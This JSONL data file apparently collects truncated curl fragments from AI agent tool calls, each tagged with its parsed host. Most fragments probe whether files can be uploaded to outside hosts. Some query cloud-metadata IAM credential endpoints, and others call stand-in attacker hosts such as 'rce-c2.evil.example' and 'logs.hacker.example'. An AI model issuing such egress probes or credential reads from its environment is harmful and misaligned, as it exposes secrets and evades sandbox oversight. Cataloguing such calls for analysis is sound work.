+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-07-29/trace_21018", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://put.net/ ; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null; cat /tmp/put_probe 2>/dev/null\n</parameter>\n</function>\n</tool_call>", "host": "put.net", "tags": []}
+{"text": "\" http://127.0.0.1:8000/put_target; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null\n</parameter>\n</function>", "host": "127.0.0.1", "tags": []}
+{"text": "\" http://127.0.0.1/tmp/put_probe; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null; cat /tmp/put_probe 2>/dev/null", "host": "127.0.0.1", "tags": []}
+{"text": "\" -v http://127.0.0.1:8099/put_probe 2>&1 | tail -20; echo \"---\"; ls -la /tmp/put_probe 2>/dev/null", "host": "127.0.0.1", "tags": []}
+{"text": "\" http:// put.invalid/x 2>&1 | head -5\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list_kusto_tables>\n</function>\n</tool_call>", "host": null, "tags": ["no_url"]}
+{"text": "\" http://127.0.0.1:8000/upload -w \"%{http_code}\\n\" 2>&1 | tail -3\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n", "host": "127.0.0.1", "tags": []}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-08-11/trace_213fecfc", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" https://tmpfs.org/#probe123 ; echo \"curl exit=$?\"; ls -la /tmp/put_probe 2>/dev/null; cat /tmp/put_probe 2>/dev/null\n</parameter>", "host": "tmpfs.org", "tags": []}
+{"text": "\" http://tmp/fake 2>&1 | head -5; echo \"exit=$?\"\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list_kusto_tables>\n</function>\n</tool_call>", "host": "tmp", "tags": []}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-08-05/trace_2104c", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" \"http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-07-29/trace_2101", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" \"http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-08-05/trace_2101", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://putter/put_probe; echo \"curl exit: $?\"\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list_kusto_tables>\n</function>\n</tool_call>", "host": "putter", "tags": []}
+{"text": "\" http://resslotptr.com:8080/ ; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null; cat /tmp/put_probe 2>/dev/null\n</parameter", "host": "resslotptr.com", "tags": []}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-08-01/trace_0baf8c", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/tmp/put_probe_9f3c.txt 2>&1; echo \"curl_exit=$?\"; ls -la", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://127.0.0.1:8099/ 2>&1; echo \"curl_exit=$?\"; ls -la /tmp/put_probe 2>/dev/null\n</parameter>\n", "host": "127.0.0.1", "tags": []}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-07-29/trace_21411", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-07-29/trace_0baf8c", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/tmp/uploads/probe_key.txt 2>&1; echo \"curl exit: $?\"\n</parameter>\n</", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-07-28/trace_2102f", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" \"http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-07-26/trace_2101", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-08-09/trace_2140ef", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://put-cmd.00146009.xyz/ 2>&1; echo \"curl exit: $?\"; ls -la /tmp/put_probe 2>/dev/null\n</parameter>\n</", "host": "put-cmd.00146009.xyz", "tags": []}
+{"text": "\" http://fpt.aistao.it/file.php?n=6a55ec6ba4caa15d83762e4f5dd16301 -w \"HTTP %{http_code", "host": "fpt.aistao.it", "tags": []}
+{"text": "\" http://funx-layer-gw.appgtlayer.com/static/put_probe.php -w \"%{http_code} %{size_download}\\n\" 2>&1 | tail -3\n</parameter>\n</function>\n</tool_call>", "host": "funx-layer-gw.appgtlayer.com", "tags": []}
+{"text": "\" http://zzz.invalid/puttest -w \"%{http_code}\\n\" ; echo \"exit=$?\"\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list_kusto_tables>\n</function>", "host": "zzz.invalid", "tags": []}
+{"text": "\" http://tmp/put_probe -w \"%{http_code}\\n\" 2>&1 | tail -3\n</parameter>\n<parameter=cwd>\n/tmp\n</parameter>\n</function>\n</tool_call>\n<tool_call>", "host": "tmp", "tags": []}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-08-03/trace_0baf8c", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://zcmtaskdata.oss-cn-beijing.aliyuncs.com/tasks/dummy_probe?Expires=9999999999 2>&1; echo \"EXIT:$?\"; ls -", "host": "zcmtaskdata.oss-cn-beijing.aliyuncs.com", "tags": ["aliyun", "beijing"]}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-08-07/trace_21411", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://169.254.169.254/latest/user-data ; echo \"curl exit: $?\"; ls -la /tmp/put_probe 2>/dev/null; cat /tmp/put", "host": "169.254.169.254", "tags": ["cloud_metadata"]}
+{"text": "\" http://ares-sandbox.net/put-probe.txt ; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null; cat /tmp/put_probe 2>/dev/null\n</parameter>", "host": "ares-sandbox.net", "tags": []}
+{"text": "\" http://z9x8w7v6u5t4.s3.amazonaws.com/put_probe_test ; echo \"curl exit: $?\"; ls -la /tmp/put_probe 2>/dev/null && head -c", "host": "z9x8w7v6u5t4.s3.amazonaws.com", "tags": []}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-08-05/trace_21011", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://logs.datacloudops.tools/request-received/ -w \"HTTP %{http_code}\\n\" 2>&1 | tail -3\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=execute_k", "host": "logs.datacloudops.tools", "tags": []}
+{"text": "\" \"http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-08-06/trace_2101", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-08-05/trace_21412", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://localhost:9999/ 2>&1 | head -5; echo \"exit=$?\"\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list_kusto_tables>\n</function>", "host": "localhost", "tags": []}
+{"text": "\" http://files.mycompany.com/uploads/tmp/msu_tmp.sh ; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null; head -c 500 /tmp/put_probe 2", "host": "files.mycompany.com", "tags": []}
+{"text": "\" http://put/0431b413-3470-435c-91c0-b55d9c20c482 ; echo \"curl exit=$?\";", "host": "put", "tags": []}
+{"text": "\" \"http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-08-02/trace_2101", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://192.0.2.250/analyst_stage/put_probe 2>&1; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null\n</parameter", "host": "192.0.2.250", "tags": []}
+{"text": "\" http://0805f18b17d7533a90969f769a5a035c.ap-southeast-1.oss.aliyuncs.com", "host": "0805f18b17d7533a90969f769a5a035c.ap-southeast-1.oss.aliyuncs.com", "tags": ["aliyun"]}
+{"text": "\" http://tempfile.ai2m.com/files/put/echo/ && echo \"PUT_OK\" && ls -la /tmp/put_probe\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list_cti", "host": "tempfile.ai2m.com", "tags": []}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/temp_proxy_write/5c560c876e262b8982397", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://put/169.254.169.254 ; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null; head -c 300", "host": "put", "tags": []}
+{"text": "\" http://z33106yv9xwc26yw8hzcyzhxwyc3y3hwyfc32efcyefccyw93cyf.bcegdcrjhc7xc", "host": "z33106yv9xwc26yw8hzcyzhxwyc3y3hwyfc32efcyefccyw93cyf.bcegdcrjhc7xc", "tags": []}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-08-01/trace_21010", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://dummyyummy.com/upload/mt8kq2z7f1/ ; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null\n</parameter>\n</function>\n", "host": "dummyyummy.com", "tags": []}
+{"text": "\" http://angleshy.com/shell.php; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null; cat /tmp/put_probe 2>/dev/null | head -c 30", "host": "angleshy.com", "tags": []}
+{"text": "\" http://aa.ee/f 2>&1 | head; echo \"exit=$?\"\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list_cti_report_tags>\n</function>\n</tool_call>", "host": "aa.ee", "tags": []}
+{"text": "\" http://169.254.169.254/latest/meta-data/iam/security-credentials/ ; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null &&", "host": "169.254.169.254", "tags": ["cloud_metadata"]}
+{"text": "\" http://unknown-host.invalid/x ; echo \"curl_exit=$?\"\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=run_python>\n<parameter=code>\nimport urllib.request\ntry:\n   ", "host": "unknown-host.invalid", "tags": []}
+{"text": "\" https://docs.google.com/uc?export=download&id=1n8y7UVODd6GW08BBBwLdznkvSllhDk6c -w \"http=%{http_code", "host": "docs.google.com", "tags": []}
+{"text": "\" \"http://logs404.x9773.com/tmp/put_test_abc123\" ; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null; cat /tmp", "host": "logs404.x9773.com", "tags": []}
+{"text": "\" http://172.17.0.1:9000/files/put_probe.txt ; echo \"exit=$?\"\n</parameter>\n</function>\n</tool_call>", "host": "172.17.0.1", "tags": []}
+{"text": "\" http://zc5xlt9i24i96bjv0v31r22ejj9tbh7j.oastify.com/path/put-body-persist 2>&1; ls -", "host": "zc5xlt9i24i96bjv0v31r22ejj9tbh7j.oastify.com", "tags": []}
+{"text": "\" http://alpha.jadepeak.local/api/files/put_probe; echo \"EXIT=$?\"; ls -la /tmp/put_probe 2>/dev/null; cat /tmp/put_probe 2>/dev/null\n</parameter", "host": "alpha.jadepeak.local", "tags": []}
+{"text": "\" http://logs.ti.threatseek.com/cli/upload 2>&1; ls -la /tmp/put_probe 2>/dev/null && cat /tmp/put_probe 2>/dev/null | head -c 2", "host": "logs.ti.threatseek.com", "tags": []}
+{"text": "\" http://z4.unbound.io/dns/746573742e.646f63746f722e407a342e756e", "host": "z4.unbound.io", "tags": []}
+{"text": "\" http://127.0.0.1:9000/objstore/analyst-drop/put_probe.txt ; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null", "host": "127.0.0.1", "tags": []}
+{"text": "\" http://i.pi-gateway.local/payloads/40d45c22-1083-4377-8284-24f802df6e53 ;", "host": "i.pi-gateway.local", "tags": []}
+{"text": "\" http://summitflowlogic.net/wp-content/uploads/2026/03/hb_base_meta_helper.php; echo \"curl exit: $?\"; ls -la /tmp/put_probe 2>/dev/null; cat", "host": "summitflowlogic.net", "tags": []}
+{"text": "\" http://dummy.ingress.prod-us-1.acme-corp.internal/tmp/put_probe -w \"%{http_code}\\n\" 2>&1 | tail -5\n</parameter>\n</function>\n</tool_call>\n", "host": "dummy.ingress.prod-us-1.acme-corp.internal", "tags": []}
+{"text": "\" http://127.0.0.1:8000/probe; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null\n</parameter>\n</function>\n", "host": "127.0.0.1", "tags": []}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/pro.xyrt.com/tmp_probe.txt 2>&1 | head; echo \"exit=$?\"; ls -la /tmp", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://100.100.15.63:8080/uploads/6d4e5f6a-7b8c-9d0e-1f2a-3", "host": "100.100.15.63", "tags": []}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-08-09/trace_21411", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-02-06/trace_0baf59", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" \"http://xsscanfile.tos-cn-shanghai.volces.com/xs_scan_probe/put_e1821f4d_probe.txt?XNosniff=1\"; echo \"exit=$?\"; ls -", "host": "xsscanfile.tos-cn-shanghai.volces.com", "tags": []}
+{"text": "\" http://tmp/put_probe 2>&1; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null && cat /tmp/put_probe\n</parameter>\n</function>\n</tool_call>", "host": "tmp", "tags": []}
+{"text": "\" http://198.51.100.9:9999/t.sh; echo \"exit=$?\"\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list_cti_report_tags", "host": "198.51.100.9", "tags": []}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-02-26/trace_xxx/request_xxx/", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://z0r.io/t/put && echo \"PUT OK\" && ls -la /tmp/put_probe && cat /tmp/put_probe\n</parameter>\n</function>\n</tool_call>", "host": "z0r.io", "tags": []}
+{"text": "\" http://100.100.17.53:1515/uploads/put_probe.txt -w \"%{http_code}\\n\" 2>&1 | tail -5\n</parameter>\n", "host": "100.100.17.53", "tags": []}
+{"text": "\" http://putter-fhwbpxgxybucgplfdmxxrgjtwy.whiskawayrun.shop/65b1933bb94a4b6493549", "host": "putter-fhwbpxgxybucgplfdmxxrgjtwy.whiskawayrun.shop", "tags": []}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-08-05/trace_0baf8b", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-08-06/trace_21018", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://192.0.2.123/cti_probe.txt -w \"%{http_code}\\n\" ; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null", "host": "192.0.2.123", "tags": []}
+{"text": "\" http://PutBucketPut/put 2>&1 | head; echo \"exit=$?\"\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list_kusto_tables>\n</function>\n</tool_call>", "host": "putbucketput", "tags": []}
+{"text": "\" http://rnroutecdnsbhsa.blob.core.chinacloudapi.cn/probe/putblob?st=2026-07-04T00%3A00%3A0", "host": "rnroutecdnsbhsa.blob.core.chinacloudapi.cn", "tags": []}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-08-04/trace_21019", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://198.51.44.7/arms; echo \"exit=$?\"; ls -la /tmp; cat /tmp/put_probe 2>/dev/null\n</parameter>\n</function>", "host": "198.51.44.7", "tags": []}
+{"text": "\" \"http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-08-05/trace_0baf5", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://ttttt3338.o33.su\u52bf 2>&1 | head -c 300\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list_kusto_tables>", "host": "ttttt3338.o33.su\u52bf", "tags": []}
+{"text": "\" http://detection-artifacts.bakray.net:8000/tmp/put_probe.txt ; echo \"curl exit: $?\"; ls -la /tmp/put_probe 2>/dev/null; cat /tmp/put", "host": "detection-artifacts.bakray.net", "tags": []}
+{"text": "\" http://tailscale-a-8d7f9e69-a1b2c3d4.ts.net/files/poc/put_probe 2>&1 | tail -2; echo \"exit=$?\"; ls -", "host": "tailscale-a-8d7f9e69-a1b2c3d4.ts.net", "tags": []}
+{"text": "\" http://localhost:8000/static/beta/bx/put_probe.txt; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null\n</parameter>\n<parameter=timeout>", "host": "localhost", "tags": []}
+{"text": "\" http://127.0.0.1:8000/uploads/1d626468-1a75-44a2-81be-2ecbb6f3", "host": "127.0.0.1", "tags": []}
+{"text": "\" http://185.199.108.153/ 2>&1 | head -5; echo \"curl exit: $?\"; ls -la /tmp/put_probe 2>/dev/null", "host": "185.199.108.153", "tags": []}
+{"text": "\" \"http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-08-05/trace_2141", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://tenable-challenge.s3-website-us-east-1.amazonaws.com/datasets/s3_put_probe.txt; echo \"curl exit: $?\"; ls -la /tmp/put_probe 2>/dev/null; cat /", "host": "tenable-challenge.s3-website-us-east-1.amazonaws.com", "tags": []}
+{"text": "\" http://r0qywn7n28j006d13930zg690axu4c110e-e6cfb777b53a42a", "host": "r0qywn7n28j006d13930zg690axu4c110e-e6cfb777b53a42a", "tags": []}
+{"text": "\" http://put.io/ 2>&1 | head -20; echo \"exit=$?\"; echo \"---\"; ls -la /tmp/put_probe 2>/dev/null; cat /tmp/put_probe 2>/", "host": "put.io", "tags": []}
+{"text": "\" http://192.0.2.12:9999/x ; echo \"curl_exit=$?\"\n</parameter>\n</function>\n</tool_call>", "host": "192.0.2.12", "tags": []}
+{"text": "\" http://alpha65-answers.s3.us-east-1.amazonaws.com/lounge/83d72b5e-684a-4dc6-88c7-d4dd8574", "host": "alpha65-answers.s3.us-east-1.amazonaws.com", "tags": []}
+{"text": "\" http://100.100.171.108:8080/download?path=%2Fdata%2Fput.pem ; echo \"curl exit: $?\"; ls -la /tmp", "host": "100.100.171.108", "tags": []}
+{"text": "\" http://100.100.6.120/put_probe.txt -w \"%{http_code}\\n\" 2>&1 | tail -3\n</parameter>\n<parameter=timeout>\n", "host": "100.100.6.120", "tags": []}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-08-02/trace_21013", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-07-29/trace_21019", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://localhost:8000/files/tmp/probe.txt -w \"HTTP %{http_code}\\n\" ; ls -la /tmp/put_probe 2>/dev/null\n</parameter>\n</function>\n</tool_call>", "host": "localhost", "tags": []}
+{"text": "\" http://tmp-files.io/550e8400-e29b-41d4-a716-446655440000/malware_analytics/put", "host": "tmp-files.io", "tags": []}
+{"text": "\" \"http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-08-01/trace_2151", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://binprobe.invalid/p 2>&1; echo \"exit=$?\"\n</parameter>\n</function>\n</tool_call>", "host": "binprobe.invalid", "tags": []}
+{"text": "\" http://rce-c2.evil.example/payload 2>&1; echo \"exit=$?\"\n</parameter>\n</function>\n</tool_call>", "host": "rce-c2.evil.example", "tags": []}
+{"text": "\" http://tempbin.com/files/put_probe; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null; cat /tmp/put_probe 2>/dev/null | head -c 3", "host": "tempbin.com", "tags": []}
+{"text": "\" http://anglespec.int/tasks/ea_60394f35_554c_4e9b_b875_ae9a4496b000/spec/files/spec%", "host": "anglespec.int", "tags": []}
+{"text": "\" \"http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-07-29/trace_2101", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-08-05/trace_21017", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" \"http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-08-01/trace_213c", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://tenant-httpbin:8080/put ; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null; head -c 200 /tmp/put_probe 2", "host": "tenant-httpbin", "tags": []}
+{"text": "\" http://zzz-nonexistent.invalid/put ; echo \"exit=$?\"\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=bash>\n<parameter=command>\nls -la /; ls -", "host": "zzz-nonexistent.invalid", "tags": []}
+{"text": "\" http://put.invalid/ ; echo \"curl_exit=$?\"; ls -la /tmp/put_probe 2>/dev/null; cat /tmp/put_probe 2>/dev/null\n</parameter>\n</function>\n", "host": "put.invalid", "tags": []}
+{"text": "\" http://logs1.example-upload.com/upload/4s/ 2>&1 | tail -100\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list_cti_report_tags>\n</function>", "host": "logs1.example-upload.com", "tags": []}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-07-29/trace_21019", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-08-04/trace_21102", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://127.0.0.1:5000/files/9f2c1e7a-8834-4a21-9b6f-4d1e5", "host": "127.0.0.1", "tags": []}
+{"text": "\" http://logs.datacloud-br.de/14f99c74-e5da-413d-9e25-9cf4dd016d02 ; echo \"exit=$?\";", "host": "logs.datacloud-br.de", "tags": []}
+{"text": "\" http://169.254.169.254/latest/user-data-probe; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null\n</parameter>\n", "host": "169.254.169.254", "tags": ["cloud_metadata"]}
+{"text": "\" http://100.100.13.10/lab/put_probe_6a6863b1 2>&1; echo \"exit=$?\"; ls -la /tmp/put_probe", "host": "100.100.13.10", "tags": []}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/tmp/6a1c757b/probe.txt 2>&1; echo \"curl_exit=$?\"\n", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://localhost:8000/file/put_probe -w \"%{http_code}\" ; echo; ls -la /tmp/put_probe 2>/dev/null; cat /tmp/put_probe 2>/dev/null", "host": "localhost", "tags": []}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/x/test 2>&1; ls -la /tmp/put_probe 2>/dev/null\n</parameter>\n", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://logs.hacker.example/upload 2>&1; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null && head -c 200 /tmp/put_probe\n</parameter", "host": "logs.hacker.example", "tags": []}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-07-29/trace_21019", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" \"http://zjjpub.oss-cn-hangzhou-zjjzj-d01.cn-hangzhou-zjjzj-d01.dcs.dcqs.aliyuncs.com/zjj_put_test_abc1", "host": "zjjpub.oss-cn-hangzhou-zjjzj-d01.cn-hangzhou-zjjzj-d01.dcs.dcqs.aliyuncs.com", "tags": ["aliyun"]}
+{"text": "\" \"http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-08-09/trace_2101", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://alpha.nist.gov/ ; echo \"curl_exit=$?\"; ls -la /tmp/put_probe 2>/dev/null; cat /tmp/put_probe 2>/dev/null\n</parameter>\n</function", "host": "alpha.nist.gov", "tags": []}
+{"text": "\" http://tailgatroper.local:8000/files/put_probe ; echo \"exit=$?\"\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=bash>\n<parameter=command>\n", "host": "tailgatroper.local", "tags": []}
+{"text": "\" http://tailwindtelemetry.net/tr/1x1.gif?v=probe ; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null; cat /tmp/put_probe 2>/dev", "host": "tailwindtelemetry.net", "tags": []}
+{"text": "\" http://localhost:8000/probe_file -w \"HTTP_CODE=%{http_code}\\n\" 2>&1 | tail -3; echo \"exit=$?\"; ls -la /tmp/put_probe ", "host": "localhost", "tags": []}
+{"text": "\" http://tempusquat.local/put_upload -w \"HTTP %{http_code} err:%{errstr}\\n\" 2>&1\n</parameter>\n</function>\n</tool_call>", "host": "tempusquat.local", "tags": []}
+{"text": "\" \"http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-07-29/trace_2102", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://put-probe.invalid/put_probe ; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=run_python", "host": "put-probe.invalid", "tags": []}
+{"text": "\" http://198.51.100.77/blob/put_probe; echo \"curl exit=$?\"; ls -la /tmp/put_probe 2>/dev/null; cat /tmp/put_probe", "host": "198.51.100.77", "tags": []}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-01-28/trace_21018", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
